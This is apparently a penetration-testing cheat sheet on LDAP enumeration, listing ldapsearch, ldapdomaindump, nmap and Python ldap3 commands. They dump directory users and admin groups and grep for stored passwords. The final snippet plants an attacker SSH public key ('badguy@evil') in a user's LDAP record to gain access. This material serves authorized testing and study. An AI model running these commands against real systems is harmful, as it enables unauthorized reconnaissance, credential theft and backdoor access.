---
description: Lightweight Directory Access Protocol Enumeration
---

# LDAP

## ldapdomaindump

```
pipx install ldapdomaindump
ldapdomaindump.py ldap://$TARGET:139
```

## ldapsearch

note ldapsearch can authenticate against kerberos instead of NTLM by passing `-Y GSSAPI`

<pre><code><strong>#anonymous credential LDAP dump
</strong><strong>ldapsearch -LLL -x -H ldap:// -b '' -s base '(objectclass=*)'
</strong>
#check null credentials
ldapsearch -x -H ldap://&#x3C;IP> -D '' -w '' -b "DC=&#x3C;1_SUBDOMAIN>,DC=&#x3C;TLD>"

#check credentials
ldapsearch -x -H ldap://&#x3C;IP> -D '&#x3C;DOMAIN>\&#x3C;username>' -w '&#x3C;password>' -b "DC=&#x3C;1_SUBDOMAIN>,DC=&#x3C;TLD>"

#extract users
ldapsearch -x -H ldap://&#x3C;IP> -D '&#x3C;DOMAIN>\&#x3C;username>' -w '&#x3C;password>' -b "CN=Users,DC=&#x3C;1_SUBDOMAIN>,DC=&#x3C;TLD>"

#extract computers
ldapsearch -x -H ldap://&#x3C;IP> -D '&#x3C;DOMAIN>\&#x3C;username>' -w '&#x3C;password>' -b "CN=Computers,DC=&#x3C;1_SUBDOMAIN>,DC=&#x3C;TLD>"

#extract my(user) info
ldapsearch -x -H ldap://&#x3C;IP> -D '&#x3C;DOMAIN>\&#x3C;username>' -w '&#x3C;password>' -b "CN=&#x3C;MY NAME>,CN=Users,DC=&#x3C;1_SUBDOMAIN>,DC=&#x3C;TLD>"

#extract domain admins
ldapsearch -x -H ldap://&#x3C;IP> -D '&#x3C;DOMAIN>\&#x3C;username>' -w '&#x3C;password>' -b "CN=Domain Admins,CN=Users,DC=&#x3C;1_SUBDOMAIN>,DC=&#x3C;TLD>"

#extract enterprise admins
ldapsearch -x -H ldap://&#x3C;IP> -D '&#x3C;DOMAIN>\&#x3C;username>' -w '&#x3C;password>' -b "CN=Enterprise Admins,CN=Users,DC=&#x3C;1_SUBDOMAIN>,DC=&#x3C;TLD>"

#extract admins
ldapsearch -x -H ldap://&#x3C;IP> -D '&#x3C;DOMAIN>\&#x3C;username>' -w '&#x3C;password>' -b "CN=Administrators,CN=Builtin,DC=&#x3C;1_SUBDOMAIN>,DC=&#x3C;TLD>"

#extract remote desktop group
ldapsearch -x -H ldap://&#x3C;IP> -D '&#x3C;DOMAIN>\&#x3C;username>' -w '&#x3C;password>' -b "CN=Remote Desktop Users,CN=Builtin,DC=&#x3C;1_SUBDOMAIN>,DC=&#x3C;TLD>"

#to see if possess credentials for any user listed in above query:
&#x3C;ldapsearchcmd...> | grep -i -A2 -B2 "userpas"</code></pre>

```
ldapsearch -H ldaps://arbitrarycompany.com:636/ -x -s base -b '' "(objectClass=*)" "*" +
```

## nmap

```
nmap -n -sV --script "ldap* and not brute" $TARGET
```

## Manual Python Enumeration

### Basic

```python
>>> import ldap3
>>> server = ldap3.Server('$TARGET', get_info = ldap3.ALL, port =636, use_ssl = True)
>>> connection = ldap3.Connection(server)
>>> connection.bind()
True #this means success
>>> server.info
[goal is to get naming contexts, e.g., dc=DOMAIN,dc=DOMAIN]

[dump all objects in directory]
>>> connection.search(search_base='DC=DOMAIN,DC=DOMAIN', search_filter='(&(objectClass=*))', search_scope='SUBTREE', attributes='*')
True #this means success
>> connection.entries

[dump whole ldap]
>> connection.search(search_base='DC=DOMAIN,DC=DOMAIN', search_filter='(&(objectClass=person))', search_scope='SUBTREE', attributes='userPassword')
True
>>> connection.entries
```

### Write data

```python
>>> import ldap3
>>> server = ldap3.Server('$TARGET', port =636, use_ssl = True)
>>> connection = ldap3.Connection(server, 'uid=USER,ou=USERS,dc=DOMAIN,dc=DOMAIN', 'PASSWORD', auto_bind=True)
>>> connection.bind()
True #this means success
>>> connection.extend.standard.who_am_i()
u'dn:uid=USER,ou=USERS,dc=DOMAIN,dc=DOMAIN'
>>> connection.modify('uid=USER,ou=USERS,dc=DOMAINM=,dc=DOMAIN',{'sshPublicKey': [(ldap3.MODIFY_REPLACE, ['ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDHRMu2et/B5bUyHkSANn2um9/qtmgUTEYmV9cyK1buvrS+K2gEKiZF5pQGjXrT71aNi5VxQS7f+s3uCPzwUzlI2rJWFncueM1AJYaC00senG61PoOjpqlz/EUYUfj6EUVkkfGB3AUL8z9zd2Nnv1kKDBsVz91o/P2GQGaBX9PwlSTiR8OGLHkp2Gqq468QiYZ5txrHf/l356r3dy/oNgZs7OWMTx2Rr5ARoeW5fwgleGPy6CqDN8qxIWntqiL1Oo4ulbts8OxIU9cVsqDsJzPMVPlRgDQesnpdt4cErnZ+Ut5ArMjYXR2igRHLK7atZH/qE717oXoiII3UIvFln2Ivvd8BRCvgpo+98PwN8wwxqV7AWo0hrE6dqRI7NC4yYRMvf7H8MuZQD5yPh2cZIEwhpk7NaHW0YAmR/WpRl4LbT+o884MpvFxIdkN1y1z+35haavzF/TnQ5N898RcKwll7mrvkbnGrknn+IT/v3US19fPJWzl1/pTqmAnkPThJW/k= badguy@evil'])]})
```

##
